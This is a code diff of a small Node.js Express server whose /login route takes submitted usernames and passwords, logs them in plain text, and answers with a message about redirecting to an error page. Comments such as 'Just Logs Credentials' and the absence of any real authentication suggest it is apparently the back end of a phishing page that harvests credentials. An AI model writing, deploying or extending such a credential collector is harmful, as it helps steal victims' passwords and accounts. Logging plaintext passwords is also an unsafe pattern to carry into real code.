@@ -1,20 +1,20 @@
-const express = require("express");
-const cors = require("cors");
+const express = require("express"); // Import Express
+const app = express(); // Create an Express app
 
-const app = express();
-app.use(express.json());
-app.use(cors());
+app.use(express.json()); // Middleware to parse JSON data
 
-// Login Route (Just Logs Credentials)
+// API endpoint to receive login data
 app.post("/login", (req, res) => {
-    const { username, password } = req.body;
+    const { username, password } = req.body; // Extract username & password from request
 
-    // Log username & password in Render console
-    console.log(`Login Attempt: Username - ${username}, Password - ${password}`);
+    console.log("Received Username:", username);
+    console.log("Received Password:", password);
 
-    // Always send a generic response (doesn't affect frontend behavior)
-    res.json({ message: "Received credentials" });
+    // You can add authentication logic here (e.g., check in a database)
+    
+    res.status(200).json({ message: "Login received, redirecting to error page." });
 });
 
-const PORT = process.env.PORT || 3000;
+// Start the backend server
+const PORT = 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
